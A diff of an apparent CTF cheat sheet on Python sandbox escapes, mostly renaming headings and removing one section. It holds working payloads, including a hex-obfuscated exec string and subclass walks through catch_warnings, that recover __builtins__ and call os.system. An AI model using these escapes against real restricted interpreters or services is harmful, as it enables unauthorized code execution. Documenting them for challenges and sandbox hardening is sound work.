@@ -8,7 +8,7 @@
 * Updated command, after converting payload to octal
   * `exec("\x5bi for i in \x28)\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbases\x5f\x5f\x5b0]\x2e\x5f\x5fsubclasses\x5f\x5f\x28) if i\x2e\x5f\x5fname\x5f\x5f=='catch\x5fwarnings']\x5b0]\x28)\x2e\x5fmodule\x2e\x5f\x5fbuiltins\x5f\x5f")`
 
-## Alternative.to functions
+## Alternative.to commands
 
 * You can perform a task in multiple ways, below is a list of all different ways used to perform the same action.
 
@@ -43,7 +43,9 @@ system('ls')
 
 ```
 
-## Python builtins
+## Python Builtins
+
+### If Python builtins present
 
 * In python version 2.7.18
   * `__builtin__` is a module that stores all built in functions.
@@ -65,7 +67,7 @@ system('ls')
 * Some more builtin
   * `__builtin__.__dict__['__import__']("os").system("ls")`
 
-## No builtin module : python2
+### If No builtin module : python2 present
 
 * Restore builtin using its sub-modules
   * `__builtins__ = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__`
@@ -100,7 +102,7 @@ __builtins__["__import__"]('os').system('ls')
 get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
 
-## No builtin module : python3
+### if No builtin module : python3
 
 * `get_flag.__globals__['__builtins__'].__import__("os").system("ls")`
 
@@ -124,16 +126,7 @@ i={}\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbase\x5f\x5f\x2e\x5f\x5fsubclasses\x5f\
 
 ```
 
-## Restore builtin and commands
 
-```text
-# Restoring builtins
-__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__bui
-ltins__)
-
-# Now we can execute normal python commands
-__builtins__['__import__']('os').system('ls')
-```
 
 
 
